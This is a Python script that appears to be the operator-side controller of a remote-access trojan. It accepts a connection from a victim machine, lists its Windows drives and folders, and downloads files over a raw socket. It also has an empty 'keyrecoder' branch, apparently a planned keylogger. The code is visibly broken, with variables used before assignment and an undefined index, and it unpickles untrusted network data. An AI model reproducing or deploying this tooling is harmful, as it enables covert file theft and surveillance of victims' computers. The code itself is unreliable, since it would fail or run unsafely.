import os
import pickle
from socket import*
from win32api import*
S=socket()
S.bind(('127.0.0.1', 5555))
S.listen()
s, addr = S.accept()

disk_info=s.recv(1024).decode().split("\x00")
disk_info.pop(-1)
print("ta de info: ", disk_info)

while True:
    input_str = input(path+'>')
    command = input_str.split(" ",1)
    if command[0] == "cd":
        if len(command) == 1:
            path = ""
            print("tade disk_info:", disk_info)
        else:
            if path == "":
                if command[1]+"//" in disk_info:
                    path = command[1]
                else:
                    print("不存在盘符")
                    print("tade disk_info:", disk_info)
                    continue
            else:
                path = path+"\\"+command[1]
    elif command[0] == "dir":
        if path == "":
            print('tade disk_info:', disk_info)
        else:
            temp_command = command[0]+'|'+path
        s.send(temp_command.encode())
        dir_list = pickle.loads(s.recv(4896))
        print("=================")
        for file, isfile, size in dir_list:
            print(f"{file:<30} {str(isfile):<10} {str(size):>10}")
            print("=======================")
    elif command[0] == "get":
        temp_command = 'get'+'|'+path+"//"+command[i]
        s.send(temp_command.encode())
        filesize = int(s.recv(1024).decode())
        cursize = 0
        with open(command[1], 'wb') as f:
            while cursize<filesize:
                data = s.recv(2048)
                f.write(data)
                cursize += len(data)
    elif command[0] == "keyrecoder":
        pass
s.close()
S.close()






